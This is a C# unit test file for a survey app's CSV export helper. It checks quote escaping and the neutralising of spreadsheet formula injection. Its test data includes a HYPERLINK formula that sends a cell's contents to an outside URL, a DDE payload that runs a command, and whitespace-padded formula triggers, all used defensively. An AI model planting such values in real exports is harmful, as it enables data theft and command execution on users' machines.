using StewardshipSurvey.Pages.Staff;

namespace StewardshipSurvey.Tests.Unit
{
    /// <summary>
    /// The CSV quoting helper and the filter parser on the member report. Both are pure, so
    /// they need no database and no HTTP context.
    /// </summary>
    public class MemberReportHelperTests
    {
        [Theory]
        [InlineData("Bob", "\"Bob\"")]
        [InlineData("", "\"\"")]
        [InlineData(null, "\"\"")]
        [InlineData("Smith, Bob", "\"Smith, Bob\"")]                 // comma must stay inside quotes
        [InlineData("Bob \"Buddy\" Smith", "\"Bob \"\"Buddy\"\" Smith\"")]  // RFC 4180 doubling
        [InlineData("\"", "\"\"\"\"")]                                // a lone quote
        [InlineData("line\nbreak", "\"line\nbreak\"")]
        public void CsvField_quotes_and_escapes(string? input, string expected)
        {
            Assert.Equal(expected, MemberReportModel.CsvField(input));
        }

        [Fact]
        public void CsvField_keeps_columns_aligned_when_a_value_contains_a_quote()
        {
            // The regression this helper exists for: an embedded quote used to break the row
            // into the wrong number of columns.
            var row = string.Join(",", new[] { "Bob \"Buddy\" Smith", "b@example.com" }
                .Select(MemberReportModel.CsvField));

            Assert.Equal("\"Bob \"\"Buddy\"\" Smith\",\"b@example.com\"", row);
            Assert.Equal(2, CountCsvFields(row));
        }

        /// <summary>
        /// Formula injection. A spreadsheet decides a cell is a formula from its first
        /// character, after stripping the CSV quoting - so RFC 4180 escaping does not help
        /// here and these are a separate concern from the tests above.
        /// </summary>
        [Theory]
        [InlineData("=1+1")]
        [InlineData("+1+1")]
        [InlineData("-1+1")]
        [InlineData("@SUM(A1)")]
        [InlineData("=HYPERLINK(\"http://example.com/?d=\"&A1,\"Click\")")]
        [InlineData("=cmd|\'/c calc\'!A1")]
        public void CsvField_neutralises_a_leading_formula_trigger(string input)
        {
            var field = MemberReportModel.CsvField(input);

            Assert.StartsWith("\"\'", field);
            Assert.Equal("\"\'" + input.Replace("\"", "\"\"") + "\"", field);
        }

        [Theory]
        [InlineData("TRIGGER=1+1")]
        [InlineData("TRIGGER\t=1+1")]
        [InlineData("TRIGGER   @SUM(A1)")]
        public void CsvField_looks_past_leading_whitespace(string template)
        {
            // A spreadsheet ignores leading whitespace when deciding, so a value cannot be
            // smuggled through by padding it.
            var input = template.Replace("TRIGGER", "");

            Assert.StartsWith("\"\'", MemberReportModel.CsvField(input));
        }

        [Theory]
        [InlineData("Bob")]
        [InlineData("b@example.com")]        // @ is only a trigger in first position
        [InlineData("Smith, Bob")]
        [InlineData("5551234")]
        [InlineData("")]
        public void CsvField_leaves_ordinary_values_alone(string input)
        {
            // The prefix is visible to whoever opens the file, so it must not appear on
            // values that were never dangerous.
            Assert.DoesNotContain("\'", MemberReportModel.CsvField(input));
        }

        [Fact]
        public void CsvField_still_escapes_quotes_in_a_neutralised_value()
        {
            // The two jobs have to compose: the prefix goes on, and RFC 4180 doubling still
            // applies to the quote inside.
            Assert.Equal("\"\'=A1&\"\"x\"\"\"", MemberReportModel.CsvField("=A1&\"x\""));
        }

        [Fact]
        public void CsvField_neutralising_a_value_does_not_add_a_column()
        {
            var row = string.Join(",", new[] { "=1+1", "b@example.com" }
                .Select(MemberReportModel.CsvField));

            Assert.Equal(2, CountCsvFields(row));
        }

        [Theory]
        [InlineData("1,2,3", new[] { 1, 2, 3 })]
        [InlineData(" 1 , 2 ", new[] { 1, 2 })]      // whitespace tolerated
        [InlineData("1,notanumber,3", new[] { 1, 3 })] // garbage dropped, not thrown
        [InlineData("", new int[0])]
        [InlineData("nonsense", new int[0])]
        public void ParseIntList_keeps_only_valid_integers(string input, int[] expected)
        {
            // ParseIntList is an instance method but touches no state, so a page model built
            // with a null context is enough to reach it.
            var model = new MemberReportModel(null!);

            Assert.Equal(expected, model.ParseIntList(input));
        }

        /// <summary>Counts top-level fields, respecting RFC 4180 quoting.</summary>
        private static int CountCsvFields(string row)
        {
            var fields = 1;
            var inQuotes = false;

            for (var i = 0; i < row.Length; i++)
            {
                if (row[i] == '"')
                {
                    if (inQuotes && i + 1 < row.Length && row[i + 1] == '"')
                    {
                        i++; // an escaped quote, not a delimiter
                        continue;
                    }

                    inQuotes = !inQuotes;
                }
                else if (row[i] == ',' && !inQuotes)
                {
                    fields++;
                }
            }

            return fields;
        }
    }
}
